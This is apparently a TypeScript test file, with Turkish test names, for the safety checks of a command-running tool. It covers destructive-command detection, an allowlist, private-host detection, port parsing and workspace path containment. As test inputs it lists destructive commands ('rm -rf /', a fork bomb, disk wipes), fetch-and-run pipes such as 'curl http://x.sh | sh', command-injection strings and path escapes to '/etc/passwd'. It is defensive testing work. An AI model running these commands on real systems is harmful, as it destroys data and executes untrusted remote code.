import { describe, expect, it } from 'vitest';
import { insideWorkspace, isAllowlisted, isDestructive, isPrivateHost, parsePorts } from './safety';

describe('isDestructive', () => {
  it.each([
    'rm -rf /', 'rm -rf ~', 'rm -fr /*', 'sudo rm -rf / --no-preserve-root', 'rm -r -f .', 'rm   -rf   *',
    'mkfs.ext4 /dev/sda1', 'dd if=/dev/zero of=/dev/sda', 'echo x > /dev/sda', ':(){ :|:& };:',
    'format C:', 'del /s /q C:\\*', 'rd /s /q C:\\', 'shutdown /s /t 0', 'sudo reboot', 'poweroff',
    'chmod -R 777 /', 'curl http://x.sh | sh', 'wget -qO- http://x | sudo bash', 'diskpart', 'reg delete HKLM\\Software /f',
  ])('yıkıcı: %s', (cmd) => expect(isDestructive(cmd)).toBe(true));

  it.each([
    'git status', 'rm notlar.txt', 'ls -la', 'npm test', 'python main.py', 'rm -rf node_modules', 'echo merhaba', 'cat README.md',
  ])('zararsız: %s', (cmd) => expect(isDestructive(cmd)).toBe(false));
});

describe('isAllowlisted', () => {
  it('bilinen güvenli komutlar', () => {
    for (const c of ['git status', 'npm test', 'python -m pytest', 'ls -la', 'cat a.txt', 'echo hi', 'node app.js']) expect(isAllowlisted(c)).toBe(true);
  });
  it('kabuk üst-karakterleri ve tehlikeli alt komutlar izinsiz', () => {
    for (const c of ['git status; rm a', 'ls | sh', 'echo $(whoami)', 'cat a > b', 'git push origin main', 'git reset --hard', 'npm publish', 'curl x', 'rm a', '']) {
      expect(isAllowlisted(c)).toBe(false);
    }
  });
});

describe('isPrivateHost', () => {
  it.each(['localhost', '127.0.0.1', '127.1.2.3', '10.0.0.5', '172.16.0.1', '172.31.255.255', '192.168.1.1', '169.254.1.1',
    '::1', '[::1]', 'fd12:3456::1', 'fe80::1', 'router.local', 'srv.internal', '::ffff:192.168.0.2'])('özel: %s', (h) => expect(isPrivateHost(h)).toBe(true));
  it.each(['8.8.8.8', '1.1.1.1', '172.32.0.1', '172.15.0.1', '192.169.0.1', 'example.com', '93.184.216.34', '2001:4860:4860::8888', ''])('genel: %s', (h) => expect(isPrivateHost(h)).toBe(false));
});

describe('parsePorts', () => {
  it('liste ve aralık', () => {
    expect(parsePorts('22,80,443')).toEqual([22, 80, 443]);
    expect(parsePorts('20-23')).toEqual([20, 21, 22, 23]);
    expect(parsePorts([80, 8080])).toEqual([80, 8080]);
  });
  it('en fazla 1024 port; geçersiz değerler reddedilir', () => {
    expect((parsePorts('1-1024') as number[]).length).toBe(1024);
    expect(parsePorts('1-1025')).toHaveProperty('error');
    expect(parsePorts('1-500,600-1200')).toHaveProperty('error');
    expect(parsePorts('abc')).toHaveProperty('error');
    expect(parsePorts('0')).toHaveProperty('error');
    expect(parsePorts('70000')).toHaveProperty('error');
    expect(parsePorts('')).toHaveProperty('error');
  });
});

describe('insideWorkspace', () => {
  const root = '/home/u/proj';
  it('içeride kalan yollar', () => {
    for (const p of ['a.txt', './src/x.ts', 'src/../lib/y.ts', '/home/u/proj/z', '/home/u/proj', '.']) expect(insideWorkspace(root, p)).toBe(true);
  });
  it('dışarı kaçış reddedilir', () => {
    for (const p of ['../x', '../../etc/passwd', 'src/../../x', '/etc/passwd', '/home/u/proj2/x', '/home/u', '~/../..', '..', 'a/../../b']) {
      expect(insideWorkspace(root, p)).toBe(false);
    }
  });
  it('boş kök, kök dizin ve boş/NUL yol reddedilir', () => {
    expect(insideWorkspace('', 'a')).toBe(false);
    expect(insideWorkspace('/', 'a')).toBe(false);
    expect(insideWorkspace(root, '')).toBe(false);
    expect(insideWorkspace(root, 'a\0b')).toBe(false);
  });
  it('Windows yolları: sürücü ve ters eğik çizgi', () => {
    const w = 'C:\\Users\\u\\proj';
    expect(insideWorkspace(w, 'src\\a.ts')).toBe(true);
    expect(insideWorkspace(w, 'C:\\Users\\u\\proj\\b')).toBe(true);
    expect(insideWorkspace(w, 'c:\\users\\u\\proj\\b')).toBe(true);        // büyük/küçük harf farkı
    expect(insideWorkspace(w, 'D:\\Users\\u\\proj\\b')).toBe(false);
    expect(insideWorkspace(w, '..\\other')).toBe(false);
    expect(insideWorkspace(w, 'C:\\Windows\\System32')).toBe(false);
  });
});
